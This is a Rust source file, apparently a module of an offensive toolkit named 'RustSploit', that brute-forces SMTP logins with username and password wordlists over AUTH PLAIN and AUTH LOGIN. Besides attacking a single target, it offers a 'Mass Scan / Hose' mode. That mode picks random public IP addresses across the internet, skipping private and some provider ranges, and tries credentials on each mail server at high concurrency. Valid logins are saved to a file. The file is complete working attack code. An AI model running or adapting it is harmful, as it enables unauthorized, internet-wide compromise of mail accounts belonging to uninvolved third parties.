use anyhow::{anyhow, Context, Result};
use colored::*;
use std::net::{ToSocketAddrs, IpAddr, SocketAddr};
use std::net::TcpStream;
use std::sync::{
    atomic::{AtomicBool, AtomicUsize, Ordering},
    Arc,
};
use std::time::Duration;
use tokio::sync::{Mutex, Semaphore};
use futures::stream::{FuturesUnordered, StreamExt};
use telnet::{Telnet, Event};
use base64::{engine::general_purpose, Engine as _};
use tokio::io::AsyncWriteExt;
use tokio::fs::OpenOptions;

use crate::utils::{
    prompt_yes_no, prompt_existing_file, prompt_int_range,
    load_lines, prompt_default, prompt_wordlist,
};
use crate::modules::creds::utils::{BruteforceStats, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions};

const STATE_FILE: &str = "smtp_hose_state.log";
const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;

// Hardcoded exclusions
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    // Cloudflare
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32",
    // Google
    "8.8.8.8/32", "8.8.4.4/32"
];

#[derive(Clone)]
struct SmtpBruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: String,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    output_file: String,
    delay_ms: u64,
}

pub async fn run(target: &str) -> Result<()> {
    println!("\n{}", "=== SMTP Bruteforce Module (RustSploit) ===".bold().cyan());
    println!();

    // Check for Mass Scan Mode conditions
    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();

    if is_mass_scan {
        println!("{}", format!("[*] Target: {}", target).cyan());
        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
        return run_mass_scan(target).await;
    }

    // --- Standard Single Target Logic ---
    
    let port = prompt_int_range("Port", 25, 1, 65535).await? as u16;
    let username_wordlist = prompt_existing_file("Username wordlist file").await?;
    let password_wordlist = prompt_existing_file("Password wordlist file").await?;
    
    let threads = prompt_int_range("Threads", 8, 1, 256).await? as usize;
    let delay_ms = prompt_int_range("Delay (ms)", 50, 0, 10000).await? as u64;
    
    let stop_on_success = prompt_yes_no("Stop on first valid login?", true).await?;
    let full_combo = prompt_yes_no("Try every username with every password?", false).await?;
    let verbose = prompt_yes_no("Verbose mode?", false).await?;
    let output_file = prompt_default("Output file for results", "smtp_results.txt").await?;

    let config = SmtpBruteforceConfig {
        target: target.to_string(),
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
        output_file,
        delay_ms,
    };

    println!();
    run_smtp_bruteforce(config).await
}

async fn run_mass_scan(target: &str) -> Result<()> {
    // Prep
    let port = prompt_int_range("Port", 25, 1, 65535).await? as u16;
    let usernames_file = prompt_wordlist("Username wordlist").await?;
    let passwords_file = prompt_wordlist("Password wordlist").await?;
    
    let users = load_lines(&usernames_file)?;
    let pass_lines = load_lines(&passwords_file)?;

    if users.is_empty() { return Err(anyhow!("User list empty")); }
    if pass_lines.is_empty() { return Err(anyhow!("Pass list empty")); }

    let concurrency = prompt_int_range("Max concurrent hosts to scan", 500, 1, 10000).await? as usize;
    let verbose = prompt_yes_no("Verbose mode?", false).await?; 
    let output_file = prompt_default("Output result file", "smtp_mass_results.txt").await?;

    // Parse exclusions
    let exclusions = Arc::new(parse_exclusions(EXCLUDED_RANGES));

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let stats_checked = Arc::new(AtomicUsize::new(0));
    let stats_found = Arc::new(AtomicUsize::new(0));

    let creds_pkg = Arc::new((users, pass_lines));

    // Stats
    let s_checked = stats_checked.clone();
    let s_found = stats_found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(5)).await;
            println!(
                "[*] Status: {} IPs scanned, {} valid SMTP credentials found",
                s_checked.load(Ordering::Relaxed),
                s_found.load(Ordering::Relaxed).to_string().green().bold()
            );
        }
    });

    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";

    if run_random {
        println!("{}", "[*] Starting Random Internet Scan...".green());
        loop {
             let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
             let exc = exclusions.clone();
             let cp = creds_pkg.clone();
             let sc = stats_checked.clone();
             let sf = stats_found.clone();
             let of = output_file.clone();
             
             tokio::spawn(async move {
                 let ip = generate_random_public_ip(&exc);
                 if !is_ip_checked(&ip, STATE_FILE).await {
                     mark_ip_checked(&ip, STATE_FILE).await;
                     mass_scan_host(ip, port, cp, sf, of, verbose).await;
                 }
                 sc.fetch_add(1, Ordering::Relaxed);
                 drop(permit);
             });
        }
    } else {
        // File Mode
        let content = tokio::fs::read_to_string(target).await.unwrap_or_default();
        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());

        for ip_str in lines {
             let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
             let cp = creds_pkg.clone();
             let sc = stats_checked.clone();
             let sf = stats_found.clone();
             let of = output_file.clone();
             
             if let Ok(ip) = ip_str.parse::<IpAddr>() {
                 tokio::spawn(async move {
                    if !is_ip_checked(&ip, STATE_FILE).await {
                        mark_ip_checked(&ip, STATE_FILE).await;
                        mass_scan_host(ip, port, cp, sf, of, verbose).await;
                    }
                    sc.fetch_add(1, Ordering::Relaxed);
                    drop(permit);
                 });
             } else {
                 drop(permit); 
             }
        }
        for _ in 0..concurrency {
            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
        }
    }
    
    Ok(())
}

async fn mass_scan_host(
    ip: IpAddr, 
    port: u16,
    creds: Arc<(Vec<String>, Vec<String>)>,
    stats_found: Arc<AtomicUsize>,
    output_file: String,
    verbose: bool
) {
    let sa = SocketAddr::new(ip, port);
    
    // 1. Connection Check
    if tokio::time::timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), tokio::net::TcpStream::connect(&sa)).await.is_err() {
        return;
    }

    let (users, passes) = &*creds;

    // 2. Bruteforce
    // Reuse existing blocking sync function inside spawn_blocking?
    // The existing function uses std::net::TcpStream blocking.
    // That's fine for small lists, but suboptimal for high concurrency.
    // However, since we are inside a spawned tokio task, spawn_blocking is appropriate.
    
    let target_str = ip.to_string();

    for user in users {
        for pass in passes {
            let t_target = target_str.clone();
            let t_user = user.clone();
            let t_pass = pass.clone();
            let t_port = port;
            
            let t_target_inner = t_target.clone();
            let t_user_inner = t_user.clone();
            let t_pass_inner = t_pass.clone();
            
            // Blocking call for the actual SMTP interaction (since it uses blocking Telnet/TcpStream)
            let res = tokio::task::spawn_blocking(move || {
                try_smtp_login(&t_target_inner, t_port, &t_user_inner, &t_pass_inner)
            }).await;

            match res {
                Ok(Ok(true)) => {
                    let msg = format!("{} -> {}:{}", t_target, t_user, t_pass);
                    println!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
                    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
                       let _ = file.write_all(format!("{}\n", msg).as_bytes()).await;
                    }
                    stats_found.fetch_add(1, Ordering::Relaxed);
                    return; // Stop after first success
                }
                Ok(Ok(false)) => {
                    if verbose {
                        // Auth failed
                    }
                }
                Ok(Err(e)) => {
                     // Connection error
                     let err = e.to_string().to_lowercase();
                     if err.contains("refused") || err.contains("timeout") || err.contains("reset") {
                         return; // Stop scanning host
                     }
                }
                Err(_) => {
                    // Start/Join error
                }
            }
        }
    }
}

async fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
    let usernames = load_lines(&config.username_wordlist)?;
    let passwords = load_lines(&config.password_wordlist)?;
    
    let total_attempts = if config.full_combo {
        usernames.len() * passwords.len()
    } else {
        std::cmp::max(usernames.len(), passwords.len())
    };

    println!("[*] Loaded {} usernames, {} passwords", usernames.len(), passwords.len());
    println!("[*] Total attempts: {}", total_attempts);

    let stats = Arc::new(BruteforceStats::new());
    let found_creds = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(AtomicBool::new(false));
    let _start_time = std::time::Instant::now();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_signal.clone();
    let progress_handle = tokio::spawn(async move {
        while !stop_clone.load(Ordering::Relaxed) {
             tokio::time::sleep(Duration::from_secs(2)).await;
             stats_clone.print_progress();
        }
    });

    let semaphore = Arc::new(Semaphore::new(config.threads));
    let mut tasks = FuturesUnordered::new();

    // Generate combinations
    let mut combos = Vec::new();
    if config.full_combo {
        for u in &usernames {
            for p in &passwords {
                combos.push((u.clone(), p.clone()));
            }
        }
    } else {
        let max_len = std::cmp::max(usernames.len(), passwords.len());
        for i in 0..max_len {
            let u = &usernames[i % usernames.len()];
            let p = &passwords[i % passwords.len()];
            combos.push((u.clone(), p.clone()));
        }
    }

    // Process combinations
    for (user, pass) in combos {
         if config.stop_on_success && stop_signal.load(Ordering::Relaxed) {
            break;
         }

         let permit = semaphore.clone().acquire_owned().await?;
         let config_clone = config.clone();
         let stats_clone = stats.clone();
         let found_clone = found_creds.clone();
         let stop_signal_clone = stop_signal.clone();
         let user_clone = user.clone();
         let pass_clone = pass.clone();

         tasks.push(tokio::spawn(async move {
             let _permit = permit; 
             
             if config_clone.stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                 return;
             }
             
             // Wrap blocking logic
             let config_inner = config_clone.clone();
             let user_inner = user_clone.clone();
             let pass_inner = pass_clone.clone();
             let res = tokio::task::spawn_blocking(move || {
                 match try_smtp_login(&config_inner.target, config_inner.port, &user_inner, &pass_inner) {
                     Ok(true) => Ok(true),
                     Ok(false) => Ok(false),
                     Err(e) => Err(e),
                 }
             }).await;

             match res {
                 Ok(Ok(true)) => {
                     println!("\r{}", format!("[+] Found: {}:{}", user_clone, pass_clone).green().bold());
                     found_clone.lock().await.push((user_clone.clone(), pass_clone.clone()));
                     stats_clone.record_success();
                     if config_clone.stop_on_success {
                         stop_signal_clone.store(true, Ordering::Relaxed);
                     }
                 },
                 Ok(Ok(false)) => {
                     stats_clone.record_failure();
                     if config_clone.verbose {
                         println!("\r{}", format!("[-] Failed: {}:{}", user_clone, pass_clone).dimmed());
                     }
                 },
                 Ok(Err(e)) => {
                     stats_clone.record_error(e.to_string()).await;
                     if config_clone.verbose {
                          println!("\r{}", format!("[!] Error {}:{}: {}", user_clone, pass_clone, e).red());
                     }
                 },
                 Err(e) => {
                      stats_clone.record_error(format!("Task panic: {}", e)).await;
                 }
             }
             
             if config_clone.delay_ms > 0 {
                 tokio::time::sleep(Duration::from_millis(config_clone.delay_ms)).await;
             }
         }));
         
         // Memory management: drain completed tasks
          while let std::task::Poll::Ready(Some(_)) = futures::future::poll_fn(|cx| std::task::Poll::Ready(tasks.poll_next_unpin(cx))).await {}
    }

    while let Some(_) = tasks.next().await {}

    stop_signal.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;
    
    stats.print_final().await;
    
    // Save results
    let found = found_creds.lock().await;
    if !found.is_empty() {
        if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(&config.output_file) {
             use std::io::Write;
             for (u, p) in found.iter() {
                let _ = writeln!(file, "{}:{}", u, p);
            }
            println!("[+] Results saved to {}", config.output_file);
        }
    }

    Ok(())
}

fn try_smtp_login(target: &str, port: u16, username: &str, password: &str) -> Result<bool> {
    let addr = format!("{}:{}", target, port);
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Resolution failed"))?;
    let stream = TcpStream::connect_timeout(&socket, Duration::from_millis(2000))?;
    stream.set_read_timeout(Some(Duration::from_millis(2000)))?;
    stream.set_write_timeout(Some(Duration::from_millis(2000)))?;
    
    let mut telnet = Telnet::from_stream(Box::new(stream), 512);
    
    let mut banner_ok = false;
    for _ in 0..3 {
        let event = telnet.read().context("Banner read")?;
        if let Event::Data(b) = event {
            let s = String::from_utf8_lossy(&b);
            if s.starts_with("220") { banner_ok = true; break; }
        }
    }
    if !banner_ok { return Err(anyhow!("No 220 banner")); }
    
    telnet.write(b"EHLO scanner\r\n")?;
    
    let mut login_ok = false;
    let mut plain_ok = false;
    let mut ehlo_seen = false;
    
    for _ in 0..6 {
        let event = telnet.read().context("EHLO read")?;
        if let Event::Data(b) = event {
            let s = String::from_utf8_lossy(&b);
            if s.contains("AUTH") && s.contains("PLAIN") { plain_ok = true; }
            if s.contains("AUTH") && s.contains("LOGIN") { login_ok = true; }
            if s.starts_with("250 ") { ehlo_seen = true; break; }
        }
    }
    if !ehlo_seen { return Ok(false); }

    // Try AUTH PLAIN
    if plain_ok {
        let mut blob = vec![0];
        blob.extend(username.as_bytes()); blob.push(0); blob.extend(password.as_bytes());
        let cmd = format!("AUTH PLAIN {}\r\n", general_purpose::STANDARD.encode(&blob));
        telnet.write(cmd.as_bytes())?;
        
        for _ in 0..2 {
             let event = telnet.read().context("Auth response")?;
             if let Event::Data(b) = event {
                 let s = String::from_utf8_lossy(&b);
                 if s.starts_with("235") { telnet.write(b"QUIT\r\n").ok(); return Ok(true); }
                 if s.starts_with("535") || s.starts_with("5") { return Ok(false); }
             }
        }
    }
    
    // Try AUTH LOGIN
    if login_ok {
        telnet.write(b"AUTH LOGIN\r\n")?;
        
        // Wait for username prompt (334)
        for _ in 0..2 {
             let event = telnet.read().context("Auth Login prompt")?;
             if let Event::Data(b) = event {
                 if String::from_utf8_lossy(&b).starts_with("334") { break; }
             }
        }
        
        let ucmd = format!("{}\r\n", general_purpose::STANDARD.encode(username.as_bytes()));
        telnet.write(ucmd.as_bytes())?;
        
        // Wait for password prompt (334)
         for _ in 0..2 {
             let event = telnet.read().context("Auth Pass prompt")?;
             if let Event::Data(b) = event {
                 if String::from_utf8_lossy(&b).starts_with("334") { break; }
             }
        }
        
        let pcmd = format!("{}\r\n", general_purpose::STANDARD.encode(password.as_bytes()));
        telnet.write(pcmd.as_bytes())?;
        
        for _ in 0..2 {
            let event = telnet.read().context("Auth final response")?;
            if let Event::Data(b) = event {
                let s = String::from_utf8_lossy(&b);
                 if s.starts_with("235") { telnet.write(b"QUIT\r\n").ok(); return Ok(true); }
                 if s.starts_with("535") || s.starts_with("5") { return Ok(false); }
            }
        }
    }
    
    Ok(false)
}


